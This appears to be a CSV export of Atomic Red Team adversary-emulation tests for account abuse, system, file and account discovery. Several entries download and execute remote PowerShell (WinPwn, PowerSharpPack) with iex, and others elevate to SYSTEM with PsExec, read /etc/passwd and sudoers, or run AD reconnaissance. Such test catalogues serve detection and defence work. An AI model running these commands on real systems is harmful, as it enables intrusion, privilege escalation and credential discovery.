"TechniqueID","TestName","Command","PrereqCommand","CleanupCommand","SourceFile"
"T1078.003","Use PsExec to elevate to NT Authority\SYSTEM account","""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" -accepteula -s %COMSPEC% /c whoami
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://download.sysinternals.com/files/PSTools.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\PsTools"" -Force
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe"" ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" -Force
","","C:\AtomicRedTeam\atomics\T1078.003\T1078.003.yaml"
"T1078.004","Creating GCP Service Account and Service Account Key","gcloud config set project #{project-id}
gcloud iam service-accounts create #{service-account-name}
gcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}
","echo ""Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install""

---
gcloud auth login --no-launch-browser
","gcloud iam service-accounts delete #{service-account-email} --quiet
","C:\AtomicRedTeam\atomics\T1078.004\T1078.004.yaml"
"T1078.004","Azure Persistence Automation Runbook Created or Modified","New-AzAutomationRunbook -Name #{runbook_name} -Type PowerShell -ResourceGroupName #{resource_group} -Description 'my-test-runbook' -AutomationAccountName #{automation_account_name}
","echo ""Please install terraform via https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli (URL accurate as of Nov. 15, 2024).""

---
$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://aka.ms/installazurecliwindowsx64 -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; Remove-Item .\AzureCLI.msi

---
echo ""* Configure your Azure account using: Connect-AzAccount""

---
echo ""Navigating to: $PathToAtomicsFolder/T1078.004/src/T1078.004-2/""
cd ""$PathToAtomicsFolder/T1078.004/src/T1078.004-2/""
terraform init
terraform apply -auto-approve
","Remove-AzAutomationRunbook -AutomationAccountName #{automation_account_name} -Name #{runbook_name} -ResourceGroupName #{resource_group} -Force
Remove-AzAutomationAccount -ResourceGroupName #{resource_group} -Name #{automation_account_name} -Force
Remove-AzResourceGroup -Name #{resource_group} -Force
echo ""Cleanup should be completed. Run 'terraform destroy` to ensure remaining resources are also deleted.""
cd ""$PathToAtomicsFolder/T1078.004/src/T1078.004-2/""
terraform destroy -auto-approve
","C:\AtomicRedTeam\atomics\T1078.004\T1078.004.yaml"
"T1078.004","GCP - Create Custom IAM Role","gcloud config set project #{project-id}
gcloud iam roles create #{role-name} --description=""#{role-description}"" --permissions=#{roles} --project=#{project-id}
","echo ""Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install""

---
gcloud auth login --no-launch-browser
","gcloud iam roles delete #{role-name} --project=#{project-id}
","C:\AtomicRedTeam\atomics\T1078.004\T1078.004.yaml"
"T1082","System Information Discovery","systeminfo
reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","System Information Discovery","system_profiler
ls -al /Applications
","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","List OS Information","uname -a >> #{output_file}
if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi
if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi   
if [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi
if [ -f /etc/os-release ]; then cat /etc/os-release >> #{output_file}; fi
uptime >> #{output_file}
cat #{output_file} 2>/dev/null
","","rm #{output_file} 2>/dev/null
","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","Linux VM Check via Hardware","if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi
if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i ""Droplet\|HVM\|VirtualBox\|VMware""; fi
if [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i ""Xen\|Bochs\|QEMU""; fi
if [ -x ""$(command -v dmidecode)"" ]; then sudo dmidecode | grep -i ""microsoft\|vmware\|virtualbox\|quemu\|domu""; fi
if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i ""vmware\|vbox""; fi
if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i ""vmware\|vbox\|qemu\|virtual""; fi
if [ -x ""$(command -v lspci)"" ]; then sudo lspci | grep -i ""vmware\|virtualbox""; fi
if [ -x ""$(command -v lscpu)"" ]; then sudo lscpu | grep -i ""Xen\|KVM\|Microsoft""; fi
","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","Linux VM Check via Kernel Modules","sudo lsmod | grep -i ""vboxsf\|vboxguest""
sudo lsmod | grep -i ""vmw_baloon\|vmxnet""
sudo lsmod | grep -i ""xen-vbd\|xen-vnif""
sudo lsmod | grep -i ""virtio_pci\|virtio_net""
sudo lsmod | grep -i ""hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc""
","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","FreeBSD VM Check via Kernel Modules","kldstat | grep -i ""vmm""
kldstat | grep -i ""vbox""
","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","Hostname Discovery (Windows)","hostname
","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","Hostname Discovery","hostname
","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","Windows MachineGUID Discovery","REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid
","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","Griffon Recon","cscript ""#{vbscript}""
","New-Item -Type Directory (split-path ""#{vbscript}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1082/src/griffon_recon.vbs"" -OutFile ""#{vbscript}""
","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","Environment variables discovery on windows","set
","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","Environment variables discovery on freebsd, macos and linux","env
","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","Show System Integrity Protection status (MacOS)","csrutil status
","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","WinPwn - winPEAS","$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
winPEAS -noninteractive -consoleoutput","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","WinPwn - itm4nprivesc","$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
itm4nprivesc -noninteractive -consoleoutput","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","WinPwn - Powersploits privesc checks","$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
oldchecks -noninteractive -consoleoutput","","rm -force -recurse .\DomainRecon -ErrorAction Ignore
rm -force -recurse .\Exploitation -ErrorAction Ignore
rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
rm -force -recurse .\LocalRecon -ErrorAction Ignore
rm -force -recurse .\Vulnerabilities -ErrorAction Ignore","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","WinPwn - General privesc checks","$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
otherchecks -noninteractive -consoleoutput","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","WinPwn - GeneralRecon","$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Generalrecon -consoleoutput -noninteractive","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","WinPwn - Morerecon","$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Morerecon -noninteractive -consoleoutput","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","WinPwn - RBCD-Check","$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
RBCD-Check -consoleoutput -noninteractive","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","WinPwn - PowerSharpPack - Watson searching for missing windows patches","$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
Invoke-watson","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors","$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
Invoke-SharpUp -command ""audit""","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","WinPwn - PowerSharpPack - Seatbelt","$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
Invoke-Seatbelt -Command ""-group=all""","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","Azure Security Scan with SkyArk","Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1"" -force      
$Password = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Password
Connect-AzAccount -Credential $Credential
Connect-AzureAD -Credential $Credential
Scan-AzureAdmins -UseCurrentCred
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest ""https://raw.githubusercontent.com/cyberark/SkyArk/3293ee145e95061a8980dd7b5da0030edc4da5c0/AzureStealth/AzureStealth.ps1"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1""

---
Install-Module -Name AzureAD -Force

---
Install-Module -Name Az -Force
","$resultstime = Get-Date -Format ""yyyyMMdd""
$resultsfolder = (""Results-"" + $resultstime)
remove-item $env:temp\$resultsfolder -recurse -force -erroraction silentlycontinue
","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","Linux List Kernel Modules","lsmod
kmod list
grep vmw /proc/modules
","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","FreeBSD List Kernel Modules","kldstat
kldstat | grep vmm
","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","System Information Discovery with WMIC","wmic cpu get name
wmic MEMPHYSICAL get MaxCapacity
wmic baseboard get product
wmic baseboard get version
wmic bios get SMBIOSBIOSVersion
wmic path win32_VideoController get name
wmic path win32_VideoController get DriverVersion
wmic path win32_VideoController get VideoModeDescription
wmic OS get Caption,OSArchitecture,Version
wmic DISKDRIVE get Caption
Get-WmiObject win32_bios
","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","System Information Discovery","wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs
","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","Check computer location","reg query ""HKEY_CURRENT_USER\Control Panel\International\Geo""
","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","BIOS Information Discovery through Registry","reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v SystemBiosVersion
reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v VideoBiosVersion
","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","ESXi - VM Discovery using ESXCLI","echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh  -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{cli_script}""
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}""
","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","ESXi - Darkside system information discovery","echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh  -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{cli_script}""
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}""
","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","sysctl to gather macOS hardware info","sysctl -n hw.model","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","operating system discovery ","Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName, WindowsDirectory | Out-null","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","Check OS version via ""ver"" command","ver","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","Display volume shadow copies with ""vssadmin""","vssadmin.exe list shadows","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","Identify System Locale and Regional Settings with PowerShell","powershell.exe -c ""Get-Culture | Format-List | Out-File -FilePath %TMP%\a.txt""
","","cmd.exe /c del ""%TMP%\a.txt""
","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","Enumerate Available Drives via gdr","powershell.exe -c ""gdr -PSProvider 'FileSystem'""
","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","Discover OS Product Name via Registry","reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v ProductName
","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1082","Discover OS Build Number via Registry","reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v CurrentBuildNumber
","","","C:\AtomicRedTeam\atomics\T1082\T1082.yaml"
"T1083","File and Directory Discovery (cmd.exe)","dir /s c:\ >> #{output_file}
dir /s ""c:\Documents and Settings"" >> #{output_file}
dir /s ""c:\Program Files\"" >> #{output_file}
dir ""%systemdrive%\Users\*.*"" >> #{output_file}
dir ""%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*"" >> #{output_file}
dir ""%userprofile%\Desktop\*.*"" >> #{output_file}
tree /F >> #{output_file}
","","del #{output_file}
","C:\AtomicRedTeam\atomics\T1083\T1083.yaml"
"T1083","File and Directory Discovery (PowerShell)","ls -recurse
get-childitem -recurse
gci -recurse
","","","C:\AtomicRedTeam\atomics\T1083\T1083.yaml"
"T1083","Nix File and Directory Discovery","ls -a >> #{output_file}
if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > #{output_file}; fi;
file */* *>> #{output_file}
cat #{output_file} 2>/dev/null
find . -type f
ls -R | grep "":$"" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
locate *
which sh
","","rm #{output_file}
","C:\AtomicRedTeam\atomics\T1083\T1083.yaml"
"T1083","Nix File and Directory Discovery 2","cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > #{output_file}
if [ -f /etc/mtab ]; then cat /etc/mtab >> #{output_file}; fi;
find . -type f -iname *.pdf >> #{output_file}
cat #{output_file}
find . -type f -name "".*""
","","rm #{output_file}","C:\AtomicRedTeam\atomics\T1083\T1083.yaml"
"T1083","Simulating MAZE Directory Enumeration","$folderarray = @(""Desktop"", ""Downloads"", ""Documents"", ""AppData/Local"", ""AppData/Roaming"")
Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}
Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append #{File_to_output}
Get-ChildItem -Path ""${env:ProgramFiles(x86)}"" -erroraction silentlycontinue | Out-File -append #{File_to_output}
$UsersFolder = ""$env:homedrive\Users\""
foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue)
{
foreach ($secondarydirectory in $folderarray)
 {Get-ChildItem -Path ""$UsersFolder/$directory/$secondarydirectory"" -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}}
}
cat #{File_to_output}
","","remove-item #{File_to_output} -ErrorAction SilentlyContinue
","C:\AtomicRedTeam\atomics\T1083\T1083.yaml"
"T1083","Launch DirLister Executable","Start-Process ""#{dirlister_path}""
Start-Sleep -Second 4
Stop-Process -Name ""DirLister""
","$parentpath = Split-Path ""#{dirlister_path}""
New-Item -ItemType Directory -Force -Path $parentpath | Out-Null
Invoke-WebRequest https://github.com/SanderSade/DirLister/releases/download/v2.beta4/DirLister.v2.beta4.zip -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4.zip""
Expand-Archive -Path ""PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4.zip"" -DestinationPath ""PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4"" -Force
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4\*"" ""$parentpath"" -Recurse
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4.zip"",""PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4"" -Recurse -ErrorAction Ignore
","","C:\AtomicRedTeam\atomics\T1083\T1083.yaml"
"T1083","ESXi - Enumerate VMDKs available on an ESXi Host","echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh  -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{cli_script}""
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}""
","","C:\AtomicRedTeam\atomics\T1083\T1083.yaml"
"T1083","Identifying Network Shares - Linux","findmnt -t nfs
","","","C:\AtomicRedTeam\atomics\T1083\T1083.yaml"
"T1083","Recursive Enumerate Files And Directories By Powershell","$out = ""#{output_file}""
$dirsFilter = @('Documents','Downloads','Desktop','OneDrive')
$exts = @('.pdf','.doc','.docx','.xls','.xlsx','.txt','.zip','.rar','.7z')
$userProfile = [Environment]::GetFolderPath('UserProfile')
$tr = [System.Collections.Generic.List[string]]::new()

function MatchesExtension($path) {
  try {
    $e = [System.IO.Path]::GetExtension($path).ToLower()
    return $exts -contains $e
  } catch { return $false }
}

function Scan-Dir($root) {
  try {
    $match = $false
    foreach ($f in $dirsFilter) { if ($root -like ""*$f*"") { $match = $true; break } }
    if (-not $match) { return }

    [System.IO.Directory]::EnumerateFiles($root) | ForEach-Object {
      if (MatchesExtension $_) {
        $fi = [System.IO.FileInfo]::new($_)
        $tr.Add(""[File] $_ Size:$($fi.Length) LastWrite:$($fi.LastWriteTime)"")
      }
    }

    [System.IO.Directory]::EnumerateDirectories($root) | ForEach-Object {
      Scan-Dir $_
    }
  } catch [System.UnauthorizedAccessException] {
    $tr.Add(""[AccessDenied] $root"")
  } catch {
    $tr.Add(""[Error] $root => $($_.Exception.Message)"")
  }
}

[System.IO.Directory]::EnumerateDirectories($userProfile) | ForEach-Object { Scan-Dir $_ }

# Ensure output dir exists
$outDir = [System.IO.Path]::GetDirectoryName($out)
if (-not [string]::IsNullOrEmpty($outDir) -and -not (Test-Path $outDir)) {
  New-Item -Path $outDir -ItemType Directory -Force | Out-Null
}

# Write results
$tr | Out-File -FilePath $out -Encoding UTF8
Write-Output ""Enumeration complete. Results written to: $out""
","","Remove-Item -Path ""#{output_file}"" -ErrorAction SilentlyContinue
","C:\AtomicRedTeam\atomics\T1083\T1083.yaml"
"T1087.001","Enumerate all accounts (Local)","cat /etc/passwd > #{output_file}
cat #{output_file}
","","rm -f #{output_file}
","C:\AtomicRedTeam\atomics\T1087.001\T1087.001.yaml"
"T1087.001","View sudoers access","if [ -f /etc/sudoers ]; then sudo cat /etc/sudoers > #{output_file}; fi;
if [ -f /usr/local/etc/sudoers ]; then sudo cat /usr/local/etc/sudoers > #{output_file}; fi;
cat #{output_file}
","","rm -f #{output_file}
","C:\AtomicRedTeam\atomics\T1087.001\T1087.001.yaml"
"T1087.001","View accounts with UID 0","grep 'x:0:' /etc/passwd > #{output_file}
grep '*:0:' /etc/passwd >> #{output_file}
cat #{output_file} 2>/dev/null
","","rm -f #{output_file} 2>/dev/null
","C:\AtomicRedTeam\atomics\T1087.001\T1087.001.yaml"
"T1087.001","List opened files by user","username=$(id -u -n) && lsof -u $username
","(which pkg && pkg install -y lsof)||(which yum && yum -y install lsof)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y lsof)
","","C:\AtomicRedTeam\atomics\T1087.001\T1087.001.yaml"
"T1087.001","Show if a user account has ever logged in remotely","[ ""$(uname)"" = 'FreeBSD' ] && cmd=""lastlogin"" || cmd=""lastlog"" 
$cmd > #{output_file}
cat #{output_file}
","sudo apt-get install login; exit 1;
","rm -f #{output_file}
","C:\AtomicRedTeam\atomics\T1087.001\T1087.001.yaml"
"T1087.001","Enumerate users and groups","groups
id
","","","C:\AtomicRedTeam\atomics\T1087.001\T1087.001.yaml"
"T1087.001","Enumerate users and groups","dscl . list /Groups
dscl . list /Users
dscl . list /Users | grep -v '_'
dscacheutil -q group
dscacheutil -q user
","","","C:\AtomicRedTeam\atomics\T1087.001\T1087.001.yaml"
"T1087.001","Enumerate all accounts on Windows (Local)","net user
dir c:\Users\
cmdkey.exe /list
net localgroup ""Users""
net localgroup
","","","C:\AtomicRedTeam\atomics\T1087.001\T1087.001.yaml"
"T1087.001","Enumerate all accounts via PowerShell (Local)","net user
get-localuser
get-localgroupmember -group Users
cmdkey.exe /list
ls C:/Users
get-childitem C:\Users\
dir C:\Users\
get-localgroup
net localgroup
","","","C:\AtomicRedTeam\atomics\T1087.001\T1087.001.yaml"
"T1087.001","Enumerate logged on users via CMD (Local)","query user
","","","C:\AtomicRedTeam\atomics\T1087.001\T1087.001.yaml"
"T1087.001","ESXi - Local Account Discovery via ESXCLI","echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""esxcli system account list""
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}""
","","C:\AtomicRedTeam\atomics\T1087.001\T1087.001.yaml"
"T1087.002","Enumerate all accounts (Domain)","net user /domain
net group /domain
","","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Enumerate all accounts via PowerShell (Domain)","net user /domain
get-localgroupmember -group Users
get-aduser -filter *
","","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Enumerate logged on users via CMD (Domain)","query user /SERVER:#{computer_name}
","","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Automated AD Recon (ADRecon)","Invoke-Expression ""#{adrecon_path}""
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest -Uri ""https://raw.githubusercontent.com/sense-of-security/ADRecon/38e4abae3e26d0fa87281c1d0c65cabd4d3c6ebd/ADRecon.ps1"" -OutFile ""#{adrecon_path}""
","Get-ChildItem ""PathToAtomicsFolder\..\ExternalPayloads"" -Recurse -Force | Where{$_.Name -Match ""^ADRecon-Report-""} | Remove-Item -Force -Recurse
","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Adfind -Listing password policy","""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties
","New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""
","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Adfind - Enumerate Active Directory Admins","""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -sc admincountdmp #{optional_args}
","New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""
","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
"T1087.002","Adfind - Enumerate Active Directory User Objects","""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=person) #{optional_args}
","New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""
","","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml"
